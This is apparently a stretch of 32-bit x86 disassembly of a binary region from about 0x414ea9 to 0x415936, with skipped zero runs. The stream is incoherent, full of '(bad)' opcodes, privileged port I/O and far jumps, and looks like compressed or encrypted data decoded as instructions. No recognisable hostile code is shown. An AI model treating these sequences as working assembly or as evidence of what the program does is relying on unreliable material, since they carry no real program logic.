  414ea9:	and    ebx,DWORD PTR [ebp-0x51b83c60]
  414eaf:	and    DWORD PTR [edi+edi*4+0x55485de5],esi
  414eb6:	cmc    
  414eb7:	mov    al,ds:0xb0c7e40f
  414ebc:	leave  
  414ebd:	test   al,0x5c
  414ebf:	clc    
  414ec0:	clc    
  414ec1:	or     ch,BYTE PTR [ecx]
  414ec3:	outs   dx,BYTE PTR gs:[esi]
  414ec5:	stc    
  414ec6:	mov    cl,ah
  414ec8:	lods   al,BYTE PTR ds:[esi]
  414ec9:	sbb    eax,DWORD PTR [eax+0x6d1cb83f]
  414ecf:	or     eax,0x3d8f7d55
  414ed4:	push   ebp
  414ed5:	push   edi
  414ed6:	(bad)  
  414ed7:	xlat   BYTE PTR ds:[ebx]
  414ed8:	sahf   
  414ed9:	lahf   
  414eda:	in     eax,0xb7
  414edc:	sti    
  414edd:	into   
  414ede:	pop    ecx
  414edf:	lods   al,BYTE PTR ds:[esi]
  414ee0:	jo     0x414eb5
  414ee2:	repz rcr dh,1
  414ee5:	push   edx
  414ee6:	sub    ebp,DWORD PTR [ecx-0x3d]
  414ee9:	jecxz  0x414eb7
  414eeb:	ja     0x414f48
  414eed:	fstp   DWORD PTR [ebp+0x571de093]
  414ef3:	push   0xffffffa5
  414ef5:	mov    edi,ecx
  414ef7:	daa    
  414ef8:	dec    esp
  414ef9:	cli    
  414efa:	std    
  414efb:	mov    dl,0x58
  414efd:	repz ret 
  414eff:	jle    0x414ec5
  414f01:	dec    ebx
  414f02:	call   0xc151da0f
  414f07:	(bad)  
  414f08:	inc    edx
  414f09:	or     BYTE PTR [esi-0x57],bl
  414f0c:	shr    cl,1
  414f0e:	pop    ss
  414f0f:	jmp    0x0:0x3f
	...
  414f72:	add    BYTE PTR [eax],al
  414f74:	aaa    
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd13:0x7dadb6c9
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    eax,0x46000001
  414f8d:	addr16 jmp 0x414fdf
  414f90:	mov    al,ds:0x15ce3666
  414f95:	push   cs
  414f96:	sbb    bh,BYTE PTR [edi+0x1c]
  414f99:	ja     0x414fd3
  414f9b:	test   eax,0x415a2f0a
  414fa0:	bound  edx,QWORD PTR [esi+0x7d]
  414fa3:	and    BYTE PTR [ebp-0x4fe64cd4],dl
  414fa9:	add    dl,dl
  414fab:	mov    ah,0x60
  414fad:	pop    ebx
  414fae:	xchg   ebp,eax
  414faf:	pop    ebp
  414fb0:	js     0x414faa
  414fb2:	jae    0x414f7c
  414fb4:	enter  0x299e,0xb8
  414fb8:	ja     0x414f82
  414fba:	data16 jecxz 0x414fc1
  414fbd:	lock adc DWORD PTR [edi+ebp*2+0x25505daf],ebx
  414fc5:	cmc    
  414fc6:	jnp    0x414fe0
  414fc8:	or     cl,bh
  414fca:	shl    DWORD PTR [edi+ecx*2-0x31c9afa3],cl
  414fd1:	sar    BYTE PTR [ecx-0x24],0x4d
  414fd5:	mov    esp,0x80b3e7a2
  414fda:	popf   
  414fdb:	shl    BYTE PTR [ecx+0x5a],1
  414fde:	call   0xc773:0xcfd9bcd1
  414fe5:	xchg   edx,eax
  414fe6:	retf   
  414fe7:	sbb    eax,0x773d8ff3
  414fec:	test   DWORD PTR [ebx-0x49],ecx
  414fef:	push   edi
  414ff0:	mov    dl,BYTE PTR [eax]
  414ff2:	add    DWORD PTR [esi+0x5a],0xffffff9b
  414ff6:	ss cli 
  414ff8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ff9:	fwait
  414ffa:	mov    eax,ds:0x29d2598b
  414fff:	xor    DWORD PTR [eax+eax*4+0x326a6df],0x7f6d6880
  41500a:	push   esp
  41500b:	cmp    DWORD PTR ss:[ecx-0x6692f89b],eax
  415012:	call   0xaab2:0xacf4e99f
  415019:	in     eax,0x10
  41501b:	popa   
  41501c:	add    eax,0x53d9f3b7
  415021:	frstor [eax]
  415023:	les    esp,FWORD PTR [esi+0x3cc24778]
  415029:	out    0x25,eax
  41502b:	ins    DWORD PTR es:[edi],dx
  41502c:	push   esi
  41502d:	xchg   edx,eax
  41502e:	das    
  41502f:	cmp    eax,0xcea5a262
  415034:	adc    edx,ebx
  415036:	sar    bl,0x3b
  415039:	lods   eax,DWORD PTR ds:[esi]
  41503a:	int    0x4e
  41503c:	inc    ecx
  41503d:	cmp    dl,BYTE PTR [ebx-0x47efd77d]
  415043:	mov    ecx,0xf4f7be35
  415048:	mov    edx,0x3f5f4083
  41504d:	inc    DWORD PTR [edx]
  41504f:	inc    ecx
  415050:	pop    es
  415051:	int3   
  415052:	(bad)  
  415053:	mov    esi,0x3d45bd8f
  415058:	mov    ds:0xb7ff5204,eax
  41505d:	jb     0x415097
  41505f:	sbb    eax,0x81d360b4
  415064:	aas    
  415065:	in     eax,0xd3
  415067:	xchg   edx,eax
  415068:	or     bh,BYTE PTR [esi]
  41506a:	adc    BYTE PTR [eax-0x34c0f4f5],bl
  415070:	adc    DWORD PTR [esi+0x7fbe042a],esi
  415076:	daa    
  415077:	lahf   
  415078:	add    BYTE PTR [ecx-0x1d],al
  41507b:	push   0xfffffffd
  41507d:	mov    bl,0x8f
  41507f:	scas   eax,DWORD PTR es:[edi]
  415080:	adc    eax,0x9f96ceba
  415085:	xchg   edi,eax
  415086:	and    eax,DWORD PTR [ecx+eax*4+0xcac1f1a]
  41508d:	ds aad 0x1c
  415090:	adc    al,0x0
	...
  4150f2:	add    BYTE PTR [eax],al
  4150f4:	jnp    0x4150f8
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0xd260fc2d
  415102:	inc    edx
  415103:	(bad)  
  415104:	sbb    dh,bl
  415106:	add    BYTE PTR [eax],al
  415108:	add    eax,0xa1000001
  41510d:	mov    ch,0xb6
  41510f:	xchg   edx,eax
  415110:	pop    ds
  415111:	sti    
  415112:	mov    ch,0xc4
  415114:	pop    ecx
  415115:	mov    dl,BYTE PTR [ebx+eax*4]
  415118:	sub    bh,BYTE PTR [eax]
  41511a:	imul   ebp
  41511c:	shr    DWORD PTR [esi+0x4e],cl
  41511f:	mov    bh,0x23
  415121:	rcr    ebx,1
  415123:	push   ebp
  415124:	stos   DWORD PTR es:[edi],eax
  415125:	xchg   ecx,eax
  415126:	push   ss
  415127:	rcr    dh,cl
  415129:	mov    bh,0x58
  41512b:	xchg   ebx,eax
  41512c:	je     0x415189
  41512e:	test   cl,dl
  415130:	jl     0x41514e
  415132:	mov    eax,0x42126a50
  415137:	push   ecx
  415138:	neg    DWORD PTR [eax-0x5550bcc1]
  41513e:	inc    ebx
  41513f:	nop
  415140:	mov    ds:0xfc535230,al
  415145:	and    al,0xd0
  415147:	hlt    
  415148:	dec    edi
  415149:	dec    ebx
  41514a:	cwde   
  41514b:	ins    BYTE PTR es:[edi],dx
  41514c:	fnstcw WORD PTR [ebx]
  41514e:	push   esp
  41514f:	sub    esi,DWORD PTR [ebp+0x60]
  415152:	rol    BYTE PTR [edi],0xe7
  415155:	xchg   edi,eax
  415156:	nop
  415157:	bound  edx,QWORD PTR [ecx-0x7e56c071]
  41515d:	stc    
  41515e:	sub    ecx,eax
  415160:	out    dx,eax
  415161:	xor    al,0xa5
  415163:	sbb    DWORD PTR [ecx+0x53],ecx
  415166:	lea    ecx,[ebp+0x2e]
  415169:	adc    eax,0x3e49049c
  41516e:	cmp    ebx,DWORD PTR [ecx]
  415170:	jmp    0xb3d67dc5
  415175:	push   ds
  415176:	jle    0x41510f
  415178:	js     0x41518b
  41517a:	mov    ds:0x704535,al
  41517f:	popa   
  415180:	push   esp
  415181:	sbb    al,0x20
  415183:	push   eax
  415184:	mov    ah,0x3c
  415186:	add    eax,0x44fe97a7
  41518b:	lock fisubr WORD PTR [ebx-0x5a]
  41518f:	adc    eax,0xe111b895
  415194:	out    dx,al
  415195:	inc    esp
  415196:	mov    al,0x3f
  415198:	mov    eax,0x93e5a6ce
  41519d:	push   esp
  41519e:	inc    ecx
  41519f:	loope  0x41521a
  4151a1:	mov    edx,0x99f1df59
  4151a6:	pop    ebp
  4151a7:	out    dx,eax
  4151a8:	mov    ds:0x5e783b15,al
  4151ad:	or     BYTE PTR fs:[edi+0x23],al
  4151b1:	mov    ebp,0x7aa2be6e
  4151b6:	xchg   esi,eax
  4151b7:	arpl   WORD PTR [edi-0x5],bx
  4151ba:	cmp    al,BYTE PTR [eax-0x15accd41]
  4151c0:	sub    eax,0xdb2894a2
  4151c5:	jecxz  0x4151ae
  4151c7:	cwde   
  4151c8:	sub    edx,DWORD PTR [ebp+0x51]
  4151cb:	lahf   
  4151cc:	in     eax,dx
  4151cd:	sbb    bh,BYTE PTR [ebp-0x6b60bc7f]
  4151d3:	fsubr  st,st(4)
  4151d5:	cmp    eax,DWORD PTR [esi]
  4151d7:	mov    dl,0x9a
  4151d9:	jb     0x415253
  4151db:	cmp    eax,0x2bbbb508
  4151e0:	mov    al,ds:0xc9bc2c4d
  4151e5:	sbb    DWORD PTR [ebx-0x5af023db],esp
  4151eb:	inc    ebp
  4151ec:	shr    DWORD PTR [edi],0x5
  4151ef:	xchg   ebx,eax
  4151f0:	call   0x4215:0xe5a7b343
  4151f7:	mov    ?,WORD PTR [esi+ecx*8]
  4151fa:	cmc    
  4151fb:	ds jmp 0x4942:0x6c53bb3b
  415203:	xor    al,BYTE PTR [edx]
  415205:	jp     0x41524a
  415207:	sar    DWORD PTR [eax+edx*2],0xe7
  41520b:	std    
  41520c:	call   DWORD PTR [edi]
  41520e:	mov    ds:0xc4f5,eax
	...
  415273:	add    BYTE PTR [edi+edx*4],ch
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0xcedf190b
  415283:	retf   0xdf1d
  415286:	add    BYTE PTR [eax],al
  415288:	add    eax,0xba000001
  41528d:	cmp    al,dh
  41528f:	pop    edx
  415290:	std    
  415291:	push   cs
  415292:	or     dh,0x61
  415295:	or     eax,0x285e41ca
  41529a:	or     edx,DWORD PTR [ebx]
  41529c:	mov    bh,0x92
  41529e:	ins    DWORD PTR es:[edi],dx
  41529f:	sbb    ebp,DWORD PTR [ebp-0x32720331]
  4152a5:	pop    ss
  4152a6:	fisubr DWORD PTR [ebx+eiz*4-0x69]
  4152aa:	adc    BYTE PTR [bx+si+0x2d41],al
  4152af:	je     0x415263
  4152b1:	out    dx,eax
  4152b2:	or     ebp,DWORD PTR [edi-0x4253d828]
  4152b8:	shr    BYTE PTR [ecx-0x3bcb69c6],1
  4152be:	in     al,0x53
  4152c0:	lock fmul QWORD PTR [ebx]
  4152c3:	or     DWORD PTR [ebx],edx
  4152c5:	cwde   
  4152c6:	inc    esi
  4152c7:	push   0x73
  4152c9:	sbb    esi,DWORD PTR [edi+edx*1]
  4152cc:	popa   
  4152cd:	int    0x73
  4152cf:	bound  esp,QWORD PTR [ebx-0x2ff3b093]
  4152d5:	push   eax
  4152d6:	cli    
  4152d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152d8:	push   ds
  4152d9:	sbb    eax,0xce718627
  4152de:	imul   esi,ecx,0xe100e04f
  4152e4:	bound  eax,QWORD PTR [ecx+0x5d4be20]
  4152ea:	out    dx,eax
  4152eb:	sub    esi,ebp
  4152ed:	xchg   ebx,eax
  4152ee:	mov    ecx,0xf0d579ea
  4152f3:	scas   eax,DWORD PTR es:[edi]
  4152f4:	sub    eax,DWORD PTR [ebp+ecx*1-0x56]
  4152f8:	dec    eax
  4152f9:	mov    ch,BYTE PTR [edi+0x70]
  4152fc:	cld    
  4152fd:	mov    al,0xf0
  4152ff:	setno  BYTE PTR [ebx+ecx*1-0x5d]
  415304:	ror    DWORD PTR [esi-0x32],0x37
  415308:	jmp    0x354c1b3
  41530d:	add    dl,ch
  41530f:	jnp    0x4152d7
  415311:	std    
  415312:	jg     0x4152ad
  415314:	sub    bl,al
  415316:	sub    ch,bh
  415318:	cwde   
  415319:	popa   
  41531a:	fistp  QWORD PTR [edx+0x297f1f87]
  415320:	jmp    0x1f4e6ba9
  415325:	and    eax,eax
  415327:	push   cs
  415328:	popa   
  415329:	std    
  41532a:	iret   
  41532b:	jno    0x415363
  41532d:	sub    DWORD PTR [edx+0x131c3181],edx
  415333:	dec    edi
  415334:	ret    
  415335:	jb     0x415322
  415337:	mov    edx,?
  415339:	inc    edx
  41533a:	sbb    DWORD PTR [esi],esp
  41533c:	sbb    al,0x33
  41533e:	or     dh,BYTE PTR [ebx]
  415340:	jbe    0x4152e0
  415342:	imul   ebx,DWORD PTR [ebx+0x24fa9a4e],0x73862c8e
  41534c:	ss (bad) 
  41534e:	cmp    eax,0x1aa451a7
  415353:	mov    ebp,esi
  415355:	sahf   
  415356:	sbb    BYTE PTR [eax-0x53],0xb5
  41535a:	inc    ebp
  41535b:	mov    cl,0x1b
  41535d:	mov    edx,0xfe4ed4b1
  415362:	cmp    al,0xd7
  415364:	add    BYTE PTR [ebx],bl
  415366:	jp     0x415312
  415368:	aaa    
  415369:	das    
  41536a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41536b:	int    0xc
  41536d:	(bad)  
  41536e:	repz or BYTE PTR [edx-0x70],ah
  415372:	cld    
  415373:	add    al,0x58
  415375:	aaa    
  415376:	mov    ds:0x9179ae75,al
  41537b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41537c:	out    0x85,al
  41537e:	sbb    BYTE PTR ds:0x9c577036,dh
  415384:	fprem  
  415386:	adc    al,0x27
  415388:	loope  0x41537c
  41538a:	mov    bh,0xe9
  41538c:	jns    0x415336
  41538e:	int    0x67
  415390:	sub    eax,0x0
	...
  4153f1:	add    BYTE PTR [eax],al
  4153f3:	add    BYTE PTR [ebp-0x10],ch
  4153f6:	repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0x21d3e5b0
  415401:	pop    esp
  415402:	mov    ebx,0xe02224
  415407:	add    BYTE PTR ds:0x51000001,al
  41540d:	loopne 0x4153f1
  41540f:	bound  ecx,QWORD PTR [eax-0x6e]
  415412:	xor    DWORD PTR [ebx+esi*4-0x49],esp
  415416:	gs inc edi
  415418:	mov    dh,0x3a
  41541a:	ja     0x4153bb
  41541c:	ss inc eax
  41541e:	or     DWORD PTR [eax-0x54],0xffffffc1
  415422:	pop    edi
  415423:	pop    ds
  415424:	stc    
  415425:	shl    BYTE PTR [ebx+0x59],cl
  415428:	pop    esi
  415429:	ret    0x4df
  41542c:	int3   
  41542d:	and    BYTE PTR [edx+0x47],dh
  415430:	push   0xe237b51a
  415435:	test   al,0x6e
  415437:	nop
  415438:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415439:	push   0xffffffbe
  41543b:	pop    edx
  41543c:	test   BYTE PTR [esi],dl
  41543e:	frstor [esp+edi*1-0x6d591a3d]
  415445:	inc    ecx
  415446:	cmp    ah,BYTE PTR [ecx+edx*4-0x59]
  41544a:	jl     0x415415
  41544c:	cli    
  41544d:	jmp    0xd698:0xbf09a435
  415454:	sub    al,0xb2
  415456:	mov    BYTE PTR [ebp-0x34],cl
  415459:	add    DWORD PTR ds:0xe8045beb,0xe747bfc1
  415463:	pop    ecx
  415464:	outs   dx,DWORD PTR ds:[esi]
  415465:	push   ds
  415466:	rcl    BYTE PTR fs:[edi],cl
  415469:	adc    al,ah
  41546b:	iret   
  41546c:	in     al,dx
  41546d:	pop    ebp
  41546e:	push   esp
  41546f:	add    DWORD PTR [edi+0x63c789b9],esp
  415475:	fs jb  0x4154c3
  415478:	(bad)  
  415479:	pop    esi
  41547a:	pop    ecx
  41547b:	fcomi  st,st(7)
  41547d:	inc    edi
  41547e:	pop    ebp
  41547f:	in     al,0x73
  415481:	xor    BYTE PTR [ebx+0x64],ch
  415484:	mov    ds:0xb38d5f56,al
  415489:	add    BYTE PTR [eax],cl
  41548b:	jo     0x4154b2
  41548d:	or     al,0x20
  41548f:	cs jl  0x4154cb
  415492:	sbb    DWORD PTR ds:0xf93712b0,0xffffffc9
  415499:	add    eax,0x8cef4f9a
  41549e:	sub    eax,0x99b9ac58
  4154a3:	std    
  4154a4:	jp     0x4154a5
  4154a6:	jbe    0x4154b4
  4154a8:	cli    
  4154a9:	cmp    DWORD PTR [esi-0x12e25fb0],esp
  4154af:	dec    ecx
  4154b0:	adc    dh,BYTE PTR [ecx+eiz*1-0x71]
  4154b4:	adc    eax,0xd4da5392
  4154b9:	out    dx,al
  4154ba:	lods   eax,DWORD PTR ds:[esi]
  4154bb:	inc    ebp
  4154bc:	das    
  4154bd:	lahf   
  4154be:	xchg   esp,eax
  4154bf:	pop    ecx
  4154c0:	loope  0x415518
  4154c2:	out    0xde,al
  4154c4:	call   0xaec1f81f
  4154c9:	pop    edi
  4154ca:	mov    ds:0x3c06e098,al
  4154cf:	pop    ebp
  4154d0:	js     0x41545b
  4154d2:	sahf   
  4154d3:	jae    0x415548
  4154d5:	out    0xd8,eax
  4154d7:	pop    ecx
  4154d8:	and    BYTE PTR [eax-0x64d7f75a],dl
  4154de:	adc    DWORD PTR [ebp+ebx*4-0x42ccaa1b],esi
  4154e5:	gs xchg esi,eax
  4154e7:	adc    BYTE PTR [ecx+0x44],ch
  4154ea:	xor    DWORD PTR [ebp-0x6b],edx
  4154ed:	sbb    cl,dl
  4154ef:	sbb    eax,ebp
  4154f1:	lea    ecx,[esi+0x72]
  4154f4:	adc    ebp,DWORD PTR [ebx+0x5365802e]
  4154fa:	inc    edx
  4154fb:	mov    eax,ds:0x47bced9a
  415500:	push   DWORD PTR [edx-0x60]
  415503:	adc    al,0xa7
  415505:	lods   al,BYTE PTR ds:[esi]
  415506:	mov    ah,BYTE PTR [ebx]
  415508:	popf   
  415509:	outs   dx,DWORD PTR ds:[esi]
  41550a:	int    0xac
  41550c:	push   ebp
  41550d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41550e:	popf   
  41550f:	mov    ah,0x1b
	...
  415571:	add    BYTE PTR [eax],al
  415573:	add    ah,ah
  415575:	lock sub DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x4155c7
  415581:	pop    eax
  415582:	push   esi
  415583:	adc    DWORD PTR [edi],esp
  415585:	loope  0x415587
  415587:	add    BYTE PTR ds:0x1000001,al
  41558d:	mov    esi,0x223ecc41
  415592:	pusha  
  415593:	mov    ds:0xaa9d5f2f,eax
  415598:	push   ebp
  415599:	vmread DWORD PTR [esi],edi
  41559c:	mov    ch,0x43
  41559e:	mov    ecx,0x610bb6d7
  4155a3:	js     0x415549
  4155a5:	push   es
  4155a6:	xchg   ecx,eax
  4155a7:	loop   0x415599
  4155a9:	dec    ecx
  4155aa:	cmc    
  4155ab:	xor    ebp,DWORD PTR [ebx]
  4155ad:	sbb    eax,0xde9fc62f
  4155b2:	in     al,dx
  4155b3:	mov    dl,0x9e
  4155b5:	lock aas 
  4155b7:	push   ebx
  4155b8:	lods   eax,DWORD PTR ds:[esi]
  4155b9:	add    DWORD PTR [ebx],ebx
  4155bb:	mov    ch,0xe7
  4155bd:	jmp    0xb545:0x7ea12940
  4155c4:	fiadd  DWORD PTR [esi]
  4155c6:	pop    eax
  4155c7:	shr    DWORD PTR ds:0x61cc41bc,0xec
  4155ce:	push   0x3243f916
  4155d3:	inc    ebx
  4155d4:	push   ebx
  4155d5:	mov    ebp,0xddad097a
  4155da:	inc    esi
  4155db:	adc    DWORD PTR [ecx+0x6d],edi
  4155de:	mov    ebp,0xd41a9e95
  4155e3:	adc    al,0xc2
  4155e5:	xchg   esp,eax
  4155e6:	nop
  4155e7:	or     edx,ebp
  4155e9:	out    dx,al
  4155ea:	mul    ch
  4155ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155ed:	inc    edi
  4155ee:	dec    esp
  4155ef:	call   0xd4309f8a
  4155f4:	in     eax,0xb7
  4155f6:	xchg   edx,eax
  4155f7:	test   al,0xf6
  4155f9:	sbb    DWORD PTR [ebp-0x8],edx
  4155fc:	mov    ebx,DWORD PTR [eax-0x66]
  4155ff:	jmp    0xbde:0x579dc8b0
  415606:	dec    ecx
  415607:	jno    0x4155bc
  415609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41560a:	mov    ebp,ss
  41560c:	ins    BYTE PTR es:[edi],dx
  41560d:	ret    0xfa0
  415610:	int    0x95
  415612:	xchg   esp,eax
  415613:	loop   0x415644
  415615:	xchg   ecx,eax
  415616:	mov    eax,ds:0x9e9853e7
  41561b:	dec    eax
  41561c:	mov    eax,ds:0xacfc2104
  415621:	fmulp  st(6),st
  415623:	out    dx,eax
  415624:	add    BYTE PTR [ebp+0x4c],bl
  415627:	leave  
  415628:	push   ss
  415629:	stos   DWORD PTR es:[edi],eax
  41562a:	arpl   bx,sp
  41562c:	inc    ebx
  41562d:	cmp    al,0x3d
  41562f:	inc    ecx
  415630:	mov    dh,0xd3
  415632:	push   ebp
  415633:	jmp    0x415613
  415635:	inc    ebp
  415636:	jae    0x415630
  415638:	cmp    eax,0x729b21e9
  41563d:	je     0x4155db
  41563f:	gs fs xchg ebx,eax
  415642:	push   edx
  415643:	mov    bh,BYTE PTR [esi+ebx*8]
  415646:	ret    
  415647:	add    edx,DWORD PTR [ecx+0x3827a14a]
  41564d:	add    al,BYTE PTR [edx]
  41564f:	xchg   ebx,eax
  415650:	push   esi
  415651:	xchg   ebp,eax
  415652:	imul   edi,DWORD PTR [esi-0x521f984d],0x580ecfc0
  41565c:	inc    ecx
  41565d:	mov    WORD PTR ds:0x24bd286e,gs
  415663:	lea    esi,[ebx]
  415665:	pop    ebp
  415666:	pop    eax
  415667:	outs   dx,DWORD PTR ds:[esi]
  415668:	outs   dx,DWORD PTR ds:[esi]
  415669:	dec    ebx
  41566a:	stos   DWORD PTR es:[edi],eax
  41566b:	daa    
  41566c:	cmp    BYTE PTR [ebp-0x8],bh
  41566f:	in     eax,dx
  415670:	(bad)  
  415672:	dec    eax
  415673:	test   BYTE PTR [edx-0x63b8af29],cl
  415679:	shl    edx,cl
  41567b:	sub    eax,0x97c42f01
  415680:	aaa    
  415681:	or     al,0x65
  415683:	int    0x58
  415685:	aam    0xe2
  415687:	ror    BYTE PTR [eax+0x11],1
  41568a:	into   
  41568b:	int3   
  41568c:	mov    WORD PTR [eax+0xf357b6],es
	...
  4156f2:	add    BYTE PTR [eax],al
  4156f4:	ins    DWORD PTR es:[edi],dx
  4156f5:	call   0xbafd:0x67ff45bc
  4156fc:	mov    bl,0xba
  4156fe:	inc    esi
  4156ff:	sub    al,0x3a
  415701:	lods   al,BYTE PTR ds:[esi]
  415702:	jae    0x4156a0
  415704:	sub    al,0xe2
  415706:	add    BYTE PTR [eax],al
  415708:	add    eax,0xdf000001
  41570d:	inc    edx
  41570e:	sti    
  41570f:	out    dx,eax
  415710:	sub    esp,DWORD PTR [esi-0xd]
  415713:	jg     0x41570e
  415715:	or     DWORD PTR [ebx],ebp
  415717:	les    edi,FWORD PTR [ebx]
  415719:	lahf   
  41571a:	lea    esp,[ebx-0x6cc7443d]
  415720:	push   ebp
  415721:	cwde   
  415722:	fidiv  DWORD PTR [edx]
  415724:	stos   DWORD PTR es:[edi],eax
  415725:	in     eax,dx
  415726:	std    
  415727:	test   DWORD PTR [ebx+esi*4],edx
  41572a:	inc    edi
  41572b:	mov    ch,BYTE PTR [edi+0x60]
  41572e:	add    DWORD PTR [eax+0x6021d317],0xa06eb4f0
  415738:	mov    bl,0x1b
  41573a:	pop    edx
  41573b:	call   0xccce0fda
  415740:	dec    ebp
  415741:	pop    es
  415742:	shl    DWORD PTR [ebp-0x7ebc6bcf],0x6e
  415749:	adc    dh,BYTE PTR [ebp+0x74bbe09f]
  41574f:	aam    0x2f
  415751:	mov    ebx,0x5075d2de
  415756:	retf   
  415757:	and    eax,0x23455078
  41575c:	jo     0x415755
  41575e:	mul    BYTE PTR [ecx]
  415760:	mov    bh,0xd5
  415762:	jmp    0xd2578b7f
  415767:	adc    eax,0x91c782df
  41576c:	scas   al,BYTE PTR es:[edi]
  41576d:	add    al,0x5c
  41576f:	aad    0xfb
  415771:	in     eax,dx
  415772:	xor    BYTE PTR [edi-0x1c4ffc34],ch
  415778:	add    eax,0x72b44c1c
  41577d:	scas   eax,DWORD PTR es:[edi]
  41577e:	mov    ebp,0x413d924e
  415783:	out    dx,eax
  415784:	shr    BYTE PTR [esi-0x6b],0xc8
  415788:	xor    ch,bh
  41578a:	sbb    eax,0x75037b40
  41578f:	mov    al,0x41
  415791:	inc    ecx
  415792:	mul    DWORD PTR [edx]
  415794:	inc    ebp
  415795:	int3   
  415796:	inc    esp
  415797:	push   es
  415798:	dec    ebx
  415799:	xchg   edx,eax
  41579a:	mov    bl,0xab
  41579c:	loopne 0x41580f
  41579e:	(bad)  
  4157a0:	sbb    DWORD PTR [edi+0x7bc69471],eax
  4157a6:	sar    edx,0xb
  4157a9:	push   ss
  4157aa:	clc    
  4157ab:	add    BYTE PTR [esp+ebp*4-0x580e1037],0xc0
  4157b3:	push   edx
  4157b4:	clc    
  4157b5:	add    eax,DWORD PTR [edi]
  4157b7:	xchg   DWORD PTR [edx],esp
  4157b9:	xor    bl,cl
  4157bb:	daa    
  4157bc:	and    al,0x5
  4157be:	nop
  4157bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157c0:	push   ecx
  4157c1:	cs push cs
  4157c3:	pop    esp
  4157c4:	rcr    BYTE PTR [esi-0x7d2e17bc],1
  4157ca:	jle    0x41578c
  4157cc:	test   eax,0xa77091f3
  4157d1:	int3   
  4157d2:	pop    ebx
  4157d3:	inc    esi
  4157d4:	in     al,dx
  4157d5:	test   BYTE PTR [eax-0x62],bl
  4157d8:	gs (bad) 
  4157da:	and    ebp,ebx
  4157dc:	cmp    al,0x9c
  4157de:	stos   DWORD PTR es:[edi],eax
  4157df:	and    bh,BYTE PTR [ecx]
  4157e1:	jo     0x41582e
  4157e3:	xor    ecx,esi
  4157e5:	int3   
  4157e6:	xor    DWORD PTR [ebx-0x573d5f4f],0xf9731e7
  4157f0:	inc    esi
  4157f1:	xchg   edi,eax
  4157f2:	push   esi
  4157f3:	and    ecx,DWORD PTR ds:0x89c2cccc
  4157f9:	adc    eax,0xb91ead65
  4157fe:	loope  0x4157da
  415800:	cmp    eax,0xcc8286e3
  415805:	pusha  
  415806:	jmp    0xf5b2:0xb957b9e2
  41580d:	adc    ebx,DWORD PTR [eax]
  41580f:	ins    BYTE PTR es:[edi],dx
  415810:	jno    0x415812
	...
  415872:	add    BYTE PTR [eax],al
  415874:	retf   
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	ror    edx,cl
  415881:	fs jmp 0x41581b
  415884:	xor    ebx,esp
  415886:	add    BYTE PTR [eax],al
  415888:	add    eax,0x87000001
  41588d:	arpl   WORD PTR [ebx-0x33f8c544],ax
  415893:	dec    edx
  415894:	or     ebx,ecx
  415896:	enter  0x49e5,0x41
  41589a:	xor    eax,0x26a6b4c4
  41589f:	push   es
  4158a0:	push   ebx
  4158a1:	jl     0x415906
  4158a3:	lahf   
  4158a4:	mov    ebp,0x46770d7b
  4158a9:	loop   0x4158ae
  4158ab:	and    al,0xfc
  4158ad:	add    cl,dl
  4158af:	inc    ebx
  4158b0:	retf   0xb58f
  4158b3:	mov    esi,DWORD PTR [edi]
  4158b5:	push   0x567627ac
  4158ba:	push   esi
  4158bb:	sub    edi,DWORD PTR [edi]
  4158bd:	push   eax
  4158be:	outs   dx,BYTE PTR ds:[si]
  4158c0:	cld    
  4158c1:	push   ds
  4158c2:	push   esp
  4158c3:	lock imul edi,DWORD PTR cs:[ebx-0x2e],0x72
  4158c9:	and    ch,BYTE PTR [ebx+0x5b391434]
  4158cf:	(bad)  
  4158d0:	retf   
  4158d1:	sti    
  4158d2:	push   eax
  4158d3:	call   FWORD PTR [ecx+0x2b46154c]
  4158d9:	fcmovne st,st(5)
  4158db:	and    eax,0x1fd03476
  4158e0:	out    dx,eax
  4158e1:	sub    cl,BYTE PTR [ecx+0x19bd8b96]
  4158e7:	sub    al,0xc3
  4158e9:	mov    ds:0x5b24d73e,al
  4158ee:	lock pushf 
  4158f0:	fwait
  4158f1:	enter  0x534f,0xcf
  4158f5:	xchg   ecx,eax
  4158f6:	xchg   ebp,eax
  4158f7:	fwait
  4158f8:	xor    eax,ebp
  4158fa:	mov    eax,0x8ae485cd
  4158ff:	add    BYTE PTR [esi+0x77],0x75
  415903:	add    al,0x58
  415905:	test   al,0xc5
  415907:	pusha  
  415908:	test   BYTE PTR [eax+0x65099b2f],dl
  41590e:	mov    esi,DWORD PTR [edx]
  415910:	int    0xff
  415912:	xchg   ebx,eax
  415913:	nop
  415914:	pop    esi
  415915:	sti    
  415916:	or     BYTE PTR [ebx+0x25dad7d9],dl
  41591c:	dec    esp
  41591d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41591e:	jl     0x41590d
  415920:	mov    ch,0xc2
  415922:	dec    edx
  415924:	xchg   BYTE PTR [ecx-0x57],ch
  415927:	int    0xbe
  415929:	hlt    
  41592a:	sbb    ebx,DWORD PTR [ebx+ecx*4+0x16]
  41592e:	inc    ebp
  41592f:	ds in  eax,dx
  415931:	lds    edx,FWORD PTR [edi]
  415933:	in     eax,0xe1
  415935:	sahf   
  415936:	ins    DWORD PTR es:[edi],dx
